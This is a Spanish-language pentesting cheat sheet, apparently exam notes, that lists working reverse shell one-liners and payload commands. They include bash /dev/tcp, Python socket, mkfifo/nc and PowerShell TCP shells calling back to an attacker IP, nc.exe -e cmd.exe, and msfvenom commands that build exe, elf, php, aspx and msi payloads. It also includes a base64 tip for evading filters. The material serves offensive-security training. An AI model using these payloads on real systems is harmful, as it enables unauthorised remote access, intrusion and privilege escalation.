# 4. Reverse Shells, Listeners y Payloads

Consejo: ten guardado **revshells.com** offline para generar shells rápido.

## Listener
```bash
nc -lvnp 4443
rlwrap nc -lvnp 4443       # mejor: con historial y flechas
```

## Reverse shells - Linux

**Bash:**
```bash
bash -i >& /dev/tcp/<IP_ATACANTE>/4443 0>&1
bash -c 'bash -i >& /dev/tcp/<IP_ATACANTE>/4443 0>&1'
```

**Python3:**
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP_ATACANTE>",4443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**mkfifo (cuando nc no tiene -e):**
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP_ATACANTE> 4443 >/tmp/f
```

## Reverse shells - Windows

**PowerShell (one-liner):**
```powershell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('<IP_ATACANTE>',4443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()}"
```
> Para evadir filtros/comillas, genera la versión **base64** en revshells.com (`powershell -e <BASE64>`).

**nc.exe (si lo subes a la víctima):**
```cmd
nc.exe <IP_ATACANTE> 4443 -e cmd.exe
```

## Estabilización de TTY (Linux)
```bash
script /dev/null -c bash      # o: python3 -c 'import pty;pty.spawn("/bin/bash")'
# Presionar Ctrl+Z
stty raw -echo; fg
# Enter, luego:
export TERM=xterm
stty rows 38 columns 116      # ajusta con 'stty -a' en otra terminal
```

## Generación de payloads con msfvenom

> Recuerda: Metasploit/Meterpreter solo en 1 máquina. Un `shell_reverse_tcp` (no meterpreter) con listener nc no "gasta" Metasploit.

```bash
# Windows exe (shell, no meterpreter → se recibe con nc)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4443 -f exe -o shell.exe

# Linux elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=4443 -f elf -o shell.elf

# Web
msfvenom -p php/reverse_php LHOST=<IP> LPORT=4443 -f raw -o shell.php
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4443 -f aspx -o shell.aspx

# MSI (para AlwaysInstallElevated → ver 5-PrivEsc)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4443 -f msi -o evil.msi
```
